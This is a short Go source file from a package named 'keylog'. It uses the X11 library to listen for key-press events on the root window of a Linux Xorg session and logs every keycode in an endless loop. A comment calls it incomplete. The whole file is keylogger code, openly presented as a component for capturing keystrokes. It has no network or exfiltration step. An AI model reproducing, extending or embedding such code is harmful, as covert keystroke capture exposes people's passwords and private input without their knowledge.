//go:build !windows
// +build !windows

// Note: This code is not complete and is only work on Xorg-x11 sessions.
// The code below is for Linux and uses the X11 library to capture key presses.

package keylog

import (
	"log"

	"github.com/BurntSushi/xgb"
	"github.com/BurntSushi/xgb/xproto"
)

func InitKeyboard() {
	conn, err := xgb.NewConn()
	if err != nil {
		log.Printf("[Keylog] Error opening X connection: %v", err)
		return
	}
	defer conn.Close()

	setup := xproto.Setup(conn)
	root := setup.DefaultScreen(conn).Root

	err = xproto.ChangeWindowAttributesChecked(conn, root, xproto.CwEventMask, []uint32{xproto.EventMaskKeyPress}).Check()
	if err != nil {
		log.Printf("[Keylog] Error changing window attributes: %v", err)
		return
	}

	for {
		ev, err := conn.WaitForEvent()
		if err != nil {
			log.Printf("[Keylog] Error waiting for event: %v", err)
			return
		}

		switch e := ev.(type) {
		case xproto.KeyPressEvent:
			log.Printf("[Keylog] Key pressed: %v", e.Detail)
		}
	}
}
